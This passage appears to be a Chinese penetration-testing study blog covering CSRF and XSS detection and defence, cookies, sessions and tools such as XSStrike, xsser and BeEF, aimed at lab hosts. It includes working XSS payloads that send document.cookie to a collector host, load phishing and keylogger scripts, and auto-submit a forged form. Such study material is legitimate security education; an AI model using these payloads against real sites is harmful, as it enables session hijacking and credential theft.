/&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h1 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h1><h2 id="确定一个接口地址有没有CSRF漏洞"><a href="#确定一个接口地址有没有CSRF漏洞" class="headerlink" title="确定一个接口地址有没有CSRF漏洞"></a>确定一个<strong>接口地址</strong>有没有CSRF漏洞</h2><p>从第三方网站直接调用接口可以成功</p><h2 id="具体怎么操作"><a href="#具体怎么操作" class="headerlink" title="具体怎么操作"></a>具体怎么操作</h2><p>抓取正常通信请求的数据包，再请求一次</p><h2 id="有没有工具可以使用"><a href="#有没有工具可以使用" class="headerlink" title="有没有工具可以使用"></a>有没有工具可以使用</h2><h3 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h3><p><img src="assets/image-20221121164549560.png" alt="image-20221121164549560"></p><h3 id="CSRF-Tester"><a href="#CSRF-Tester" class="headerlink" title="CSRF Tester"></a>CSRF Tester</h3><h3 id="Bolt"><a href="#Bolt" class="headerlink" title="Bolt"></a>Bolt</h3><p>安装</p><p><code>git clonehttps://github.com/s0md3v/Bolt</code> </p><p>检测</p><p><a href="http://192.168.31.193:8087/transfer.php%E6%9C%89%E6%B2%A1%E6%9C%89csrf%E6%BC%8F%E6%B4%9E">http://192.168.31.193:8087/transfer.php有没有csrf漏洞</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">/</span>home<span class="token operator">/</span>kali<span class="token operator">/</span>Bolt<span class="token punctuation">]</span>└─<span class="token comment"># python3 bolt.py -u http://192.168.31.193:8087/transfer.php</span>     ⚡ BOLT  ⚡    <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>python3<span class="token punctuation">.</span><span class="token number">10</span><span class="token operator">/</span>dist<span class="token operator">-</span>packages<span class="token operator">/</span>fuzzywuzzy<span class="token operator">/</span>fuzz<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span> UserWarning<span class="token punctuation">:</span> Using slow pure<span class="token operator">-</span>python SequenceMatcher<span class="token punctuation">.</span> Install python<span class="token operator">-</span>Levenshtein to remove this warning  warnings<span class="token punctuation">.</span>warn<span class="token punctuation">(</span><span class="token string">'Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning'</span><span class="token punctuation">)</span> ⚡ Phase<span class="token punctuation">:</span> Crawling <span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token punctuation">]</span> Parsing http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token number">.31</span><span class="token number">.193</span><span class="token punctuation">:</span><span class="token number">8087</span><span class="token operator">/</span>transfer<span class="token punctuation">.</span>php      <span class="token punctuation">[</span>!<span class="token punctuation">]</span> Crawled <span class="token number">1</span> URL<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">and</span> found <span class="token number">1</span> form<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>           ⚡ Phase<span class="token punctuation">:</span> Evaluating <span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">/</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Insecure form<span class="token punctuation">(</span>s<span class="token punctuation">)</span> found<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token number">.31</span><span class="token number">.193</span><span class="token punctuation">:</span><span class="token number">8087</span><span class="token operator">/</span>transfer<span class="token punctuation">.</span>php <span class="token punctuation">[</span>http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token number">.31</span><span class="token number">.193</span><span class="token punctuation">:</span><span class="token number">8087</span><span class="token operator">/</span>login<span class="token punctuation">.</span>php<span class="token punctuation">]</span> ⚡ Phase<span class="token punctuation">:</span> Comparing <span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">/</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> No CSRF protection to test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现有csrf,没有做防护。</p><h3 id="漏洞扫描服务"><a href="#漏洞扫描服务" class="headerlink" title="漏洞扫描服务"></a>漏洞扫描服务</h3><p><a href="https://cloud.tencent.com/product/vss">https://cloud.tencent.com/product/vss</a></p><h1 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h1><h2 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h2><ul><li>区分一个请求是<strong>来源</strong>于自己的前端页面，还是第三方的网站。</li><li>让自己的前端页面和伪造的<strong>请求变得不一 样</strong>。</li></ul><h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p>Referrer：引用页; 引荐; 来源页面 </p><p>作用：<strong>跟踪来源</strong>，比如访问统计、广告效果</p><p>检查REFERER :</p><p>referer里面是否包含了主机名,IP或域名</p><h3 id="referer的不足"><a href="#referer的不足" class="headerlink" title="referer的不足"></a>referer的不足</h3><ol><li>可以任意修改 </li><li>可以为空</li></ol><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>在请求中加入一些<strong>随机字段</strong>,</p><p>第三方不知道也猜不出来,让第三方网站无法伪造请求</p><ol><li>用户使用用户名密码登录，<strong>服务端</strong>下发一个<strong>随机的</strong> token字段给客户端，并且服务端把这个字段保存在 <strong>session</strong>中。</li><li><strong>客户端</strong>把这个token保存起来，放到<strong>隐藏字段</strong>。 </li><li><strong>用户</strong>在登陆状态下，在之后<strong>访问</strong>的时候，都要<strong>携带这个token字段</strong>。</li><li><strong>服务端</strong>从session中拿出token值进行<strong>对比</strong>，如果 一致，说明请求合法。</li><li>用户退出，<strong>session销毁，token失效</strong>。</li></ol><h3 id="Token不足"><a href="#Token不足" class="headerlink" title="Token不足"></a>Token不足</h3><p>例如还存在xss漏洞，csrf和xss组合，用<strong>xss获取到token</strong>,再利用csrf漏洞。</p><h2 id="二次验证"><a href="#二次验证" class="headerlink" title="二次验证"></a>二次验证</h2><ul><li>验证码 </li><li>短信</li><li>扫码 </li><li>人脸识别 </li><li>reCAPTCHA（IP验证）</li></ul><h2 id="浏览器的保护措施"><a href="#浏览器的保护措施" class="headerlink" title="浏览器的保护措施"></a>浏览器的保护措施</h2><h4 id="Referrer-Policy"><a href="#Referrer-Policy" class="headerlink" title="Referrer Policy"></a>Referrer Policy</h4><p><code>strict-origin-when-cross-origin</code></p><h2 id="个人用户建议"><a href="#个人用户建议" class="headerlink" title="个人用户建议"></a>个人用户建议</h2><ol><li>不要访问不安全的网站 </li><li>不要随意点开别人 发给你的链接</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/huo-qu-cookie-fa-song-you-jian/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/huo-qu-cookie-fa-song-you-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="mail-js"><a href="#mail-js" class="headerlink" title="mail.js"></a>mail.js</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> img <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>img<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>img<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://192.168.31.193:8082/sendmail.php?mycookie='</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="sendmail-php"><a href="#sendmail-php" class="headerlink" title="sendmail.php"></a>sendmail.php</h1><p>payload</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;script src=\'http://192.168.31.193:8082/mail.js\'&gt;<span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="http://192.168.31.193:8082/store.html">http://192.168.31.193:8082/store.html</a> </p><p>输入用户名产生cookie </p><p>访问 <a href="http://192.168.31.193:8082/query.php?id=1">http://192.168.31.193:8082/query.php?id=1</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/jiao-ben-zhu-ru-wang-ye-xss/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/jiao-ben-zhu-ru-wang-ye-xss/</url>
      
        <content type="html"><![CDATA[<h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><h2 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h2><p><a href="http://192.168.31.193:8082/reflect.html">http://192.168.31.193:8082/reflect.html</a><br><strong>POST请求</strong> </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h2><p><a href="http://192.168.31.193:8082/get.html">http://192.168.31.193:8082/get.html</a><br>get请求 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?url<span class="token operator">=</span>javascript:alert<span class="token punctuation">(</span>/wuya/<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p> 恶意攻击者利用web页面的漏洞，插入一些恶意 代码，当用户访问页面的时候，代码就会执行， 这个时候就达到了攻击的目的。</p><p> 除了JavaScript之外，这个脚本也可以是Java、 VBScript、ActiveX、Flash等等 </p><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p><img src="picture/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss.png" alt="反射型"></p><p>包括DOM型 </p><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p><img src="picture/image-20221119181504318.png" alt="image-20221119181504318"></p><p>利用点:文章、留言板、公告板、评论…… </p><p>演示</p><p> <a href="http://192.168.31.193:8082/store.html">http://192.168.31.193:8082/store.html</a> </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应数据库的xss表 </p><p>攻击 <a href="http://192.168.31.193:8082/query.php?id=">http://192.168.31.193:8082/query.php?id=</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/fu-wu-qi-duan-session/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/fu-wu-qi-duan-session/</url>
      
        <content type="html"><![CDATA[<h1 id="Cookie的缺点"><a href="#Cookie的缺点" class="headerlink" title="Cookie的缺点"></a>Cookie的缺点</h1><p> 客户端存储量过大</p><p> 增加通信成本 </p><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>把身份信息存储在服务器 </p><p>用Cookie给客户端下发一个Session ID </p><p>PHP SESSINO ID </p><p>Java Session ID </p><h1 id="session校验"><a href="#session校验" class="headerlink" title="session校验"></a>session校验</h1><h2 id="开启会话"><a href="#开启会话" class="headerlink" title="开启会话"></a>开启会话</h2><p>session_start() cookie/login.php </p><p>把session的字段值保存到以sessionid命名的文件 </p><h2 id="保存字段"><a href="#保存字段" class="headerlink" title="保存字段"></a>保存字段</h2><p>$_SESSION赋值 cookie/login.php </p><h2 id="校验ID"><a href="#校验ID" class="headerlink" title="校验ID"></a>校验ID</h2><p>从服务端的cookie中取出字段 cookie/index.php </p><h1 id="session销毁"><a href="#session销毁" class="headerlink" title="session销毁"></a>session销毁</h1><p>session_destory() cookie/logout.php </p><h1 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h1><p><a href="http://192.168.31.193:8081/">http://192.168.31.193:8081</a></p><p>用户名：admin </p><p>密码：123456</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/ke-hu-duan-cookie/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/ke-hu-duan-cookie/</url>
      
        <content type="html"><![CDATA[<h1 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h1><p>每一个请求都是独立的 </p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>需要重复鉴别身份 </p><h1 id="需求1"><a href="#需求1" class="headerlink" title="需求1"></a>需求1</h1><p>保持会话 </p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><ul><li>服务端给客户端下发标识</li></ul><ul><li>cookie key/value格式的文本: name=wuya,id=99</li></ul><h1 id="产生流程"><a href="#产生流程" class="headerlink" title="产生流程"></a>产生流程</h1><h2 id="浏览器第一次访问"><a href="#浏览器第一次访问" class="headerlink" title="浏览器第一次访问"></a>浏览器第一次访问</h2><p>服务器在响应中通过Set-Cookie头字段，下发 Cookie </p><h2 id="浏览器保存在本地"><a href="#浏览器保存在本地" class="headerlink" title="浏览器保存在本地"></a>浏览器保存在本地</h2><h3 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a>硬盘</h3><p>有过期时间的Cookie</p><p><code>C:\Users\15542\AppData\Local\Google\ Chrome\User Data\Default\ </code></p><h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p>没有过期时间的临时Cookie，退出浏览器即失效 </p><h2 id="浏览器随后访问"><a href="#浏览器随后访问" class="headerlink" title="浏览器随后访问"></a>浏览器随后访问</h2><p>在请求头中用Cookie字段发给服务器 </p><h1 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h1><h2 id="name-x3D-value"><a href="#name-x3D-value" class="headerlink" title="name=value"></a>name=value</h2><p> 一个name/value，就是一个cookie。name/ value这个是必须的，其他的都是可选的。如果 name重复，只取第一个</p><h2 id="expires"><a href="#expires" class="headerlink" title="expires"></a>expires</h2><p> cookie的过期时间（格林尼治时间），超过这个 时间，cookie就会失效。如果不设置，代表是临 时的cookie，cookie在浏览器关闭的时候就失效 了。</p><h2 id="max-age"><a href="#max-age" class="headerlink" title="max-age"></a>max-age</h2><p>与expires作用相同，用来告诉浏览器此cookie 多久过期（单位是秒）。max-age的优先级高于 expires</p><h2 id="domain"><a href="#domain" class="headerlink" title="domain"></a>domain</h2><p>cookie对哪个域名生效。如果没有设置，就设置 为服务器的域名。如果是临时的cookie，就不能 设置domain。</p><ul><li>比如.baidu.com，百度所有的子站都可以使用。 </li><li>zhidao.baidu.com只能百度知道使用。</li><li>Cookie具有不可跨域名性。这个是由浏览器保证 的，google服务器不能修改baidu的cookie。</li></ul><h2 id="path"><a href="#path" class="headerlink" title="path"></a>path</h2><p>除了匹配域名，还可以具体匹配到路径，如果域 名和路径都匹配，那这个cookie就会起作用。 </p><p>如果是/，这个服务器所有的路径都可以使用这 个cookie。如果没有设置，那个路径响应，path 就是哪个值 </p><h2 id="secure"><a href="#secure" class="headerlink" title="secure"></a>secure</h2><p>只有HTTPS连接，才发送cookie到服务器 </p><h2 id="httponly"><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h2><p>告知浏览器不允许通过脚本document.cookie去 更改这个值，同样这个值在document.cookie中 也不可见 </p><h1 id="Cookie特点"><a href="#Cookie特点" class="headerlink" title="Cookie特点"></a>Cookie特点</h1><ul><li>明文 </li><li>可修改 比如火狐浏览器 </li><li>大小受限</li></ul><h1 id="cookie的用途"><a href="#cookie的用途" class="headerlink" title="cookie的用途"></a>cookie的用途</h1><ul><li>保持会话 </li><li>记住密码 </li><li>跟踪用户行为</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/xss-fang-yu/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/xss-fang-yu/</url>
      
        <content type="html"><![CDATA[<h1 id="测试payload"><a href="#测试payload" class="headerlink" title="测试payload"></a>测试payload</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">=</span>'<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>"<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">%</span>3Cscript<span class="token operator">%</span><span class="token number">3</span><span class="token function">Ealert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">%</span>3C<span class="token operator">/</span>script<span class="token operator">%</span>3E<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:alert('XSS')"</span><span class="token operator">&gt;</span>onerror<span class="token operator">=</span><span class="token string">"alert('XSS')"</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h1><p>识别：正则<script></p><p>处理：<scr_ipt></p><h2 id="WAF过滤"><a href="#WAF过滤" class="headerlink" title="WAF过滤"></a>WAF过滤</h2><p>WAF——web application firewall</p><p>web应用防火墙</p><h3 id="modsecurity"><a href="#modsecurity" class="headerlink" title="modsecurity"></a><strong>modsecurity</strong></h3><p><a href="https://github.com/SpiderLabs/ModSecurity">https://github.com/SpiderLabs/ModSecurity</a></p><h1 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h1><p>htmlspecialchars()转义</p></script></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/xss-jian-cha-yu-li-yong/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/xss-jian-cha-yu-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="xsser"><a href="#xsser" class="headerlink" title="xsser"></a>xsser</h1><h2 id="主要特性"><a href="#主要特性" class="headerlink" title="主要特性"></a>主要特性</h2><p>同时使用GET和POST方法注入。 </p><p>包括各种过滤器和绕过技术。 </p><p>可以与命令行和GUI一起使用。 </p><p>将提供攻击的详细统计数据。</p><h2 id="查看参数"><a href="#查看参数" class="headerlink" title="查看参数"></a>查看参数</h2><pre class="line-numbers language-none"><code class="language-none">xsser -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考 </p><p><a href="https://www.freebuf.com/sectool/173228.html">https://www.freebuf.com/sectool/173228.html</a></p><h2 id="检查接口"><a href="#检查接口" class="headerlink" title="检查接口"></a>检查接口</h2><pre class="line-numbers language-none"><code class="language-none">xsser -u "http://192.168.31.193:8084/vulnerabilities/" -g "xss_r/?name=XSS" --cookie="security=low; PHPSESSID=9j7j5aml5k3nqj5st6grtfaiqa" -s -v --reverse-check<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：替换成DVWA最新的cookie</p><h2 id="基于搜索引擎语法检测"><a href="#基于搜索引擎语法检测" class="headerlink" title="基于搜索引擎语法检测"></a>基于搜索引擎语法检测</h2><pre class="line-numbers language-none"><code class="language-none">xsser –De "google" -d "search.php?q=" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="图形化界面"><a href="#图形化界面" class="headerlink" title="图形化界面"></a>图形化界面</h2><pre class="line-numbers language-none"><code class="language-none">xsser --gtk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h1><h2 id="整体介绍"><a href="#整体介绍" class="headerlink" title="整体介绍"></a>整体介绍</h2><ul><li>生成payload </li><li>爬虫功能 </li><li>探测WAF</li></ul><h2 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/s0md3v/XSStrike<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>python 3.6 以上 </p><h2 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h2><pre class="line-numbers language-none"><code class="language-none">python3 xsstrike.py -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><pre class="line-numbers language-none"><code class="language-none">python3 xsstrike.py -u 'http://192.168.70.130/vul/xss/xss_reflected_get.php?message=321&amp;submit=submit' <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><pre class="line-numbers language-none"><code class="language-none">python3 xsstrike.py -u "http://192.168.31.193:8082/reflect.php" --data 'name=1' <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h2><pre class="line-numbers language-none"><code class="language-none">python3 xsstrike.py -u "http://192.168.31.193:8082/get.html?url=1" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/sectool/173228.html">https://www.freebuf.com/sectool/173228.html</a></p><p><a href="https://blog.csdn.net/gao646467783/article/details/113249158">https://blog.csdn.net/gao646467783/article/details/113249158</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/xss-ping-tai/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/11xss/xss-ping-tai/</url>
      
        <content type="html"><![CDATA[<h1 id="pikachu的XSS平台"><a href="#pikachu的XSS平台" class="headerlink" title="pikachu的XSS平台"></a>pikachu的XSS平台</h1><h2 id="基于反射型GET"><a href="#基于反射型GET" class="headerlink" title="基于反射型GET"></a>基于反射型GET</h2><h3 id="获取Cookie"><a href="#获取Cookie" class="headerlink" title="获取Cookie"></a>获取Cookie</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><p><a href="http://192.168.70.130/pkxss/xcookie/cookie.php">http://192.168.70.130/pkxss/xcookie/cookie.php</a> </p><h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><p>修改输入长度 </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://192.168.70.130/pkxss/xcookie/cookie.php/cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.70.130/vul/xss/xss_reflected_get.php?message<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>document.location<span class="token operator">=</span><span class="token string">'http://192.168.70.130/pkxss/xcookie/cookie.php?cookie='</span>+document.cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;&amp;</span><span class="token assign-left variable">submit</span><span class="token operator">=</span>submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="基于反射型POST"><a href="#基于反射型POST" class="headerlink" title="基于反射型POST"></a>基于反射型POST</h2><p>访问地址 </p><p><a href="http://192.168.70.130/pkxss/xcookie/post.html">http://192.168.70.130/pkxss/xcookie/post.html</a></p><h2 id="基于存储型"><a href="#基于存储型" class="headerlink" title="基于存储型"></a>基于存储型</h2><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h4><p><a href="http://192.168.70.130/pkxss/xfish/fish.php">http://192.168.70.130/pkxss/xfish/fish.php</a> </p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"&lt;script src="</span><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.70</span><span class="token number">.130</span><span class="token operator">/</span>pkxss<span class="token operator">/</span>xfish<span class="token operator">/</span>fish<span class="token punctuation">.</span>php"<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><h4 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h4><p><a href="http://192.168.70.130/pkxss/rkeypress/rk.js">http://192.168.70.130/pkxss/rkeypress/rk.js</a> </p><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://192.168.70.130/pkxss/rkeypress/rk.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="开源XSS平台"><a href="#开源XSS平台" class="headerlink" title="开源XSS平台"></a>开源XSS平台</h1><p>源码</p><p><a href="https://github.com/78778443/xssplatform">https://github.com/78778443/xssplatform</a> </p><p>安装流程</p><p> <a href="https://mp.weixin.qq.com/s/BeTEMmTX93w4B3jThDZgYA">https://mp.weixin.qq.com/s/BeTEMmTX93w4B3jThDZgYA</a></p><h1 id="beef-xss"><a href="#beef-xss" class="headerlink" title="beef-xss"></a><strong>beef-xss</strong></h1><p>全称：The Browser Exploitation Framework</p><p><a href="https://beefproject.com/">https://beefproject.com/</a></p><p><a href="https://github.com/beefproject/beef/wiki/">https://github.com/beefproject/beef/wiki/</a></p><h2 id="安装和启动命令"><a href="#安装和启动命令" class="headerlink" title="安装和启动命令"></a>安装和启动命令</h2><pre class="line-numbers language-none"><code class="language-none">beef-xss<span aria-hidden="true" 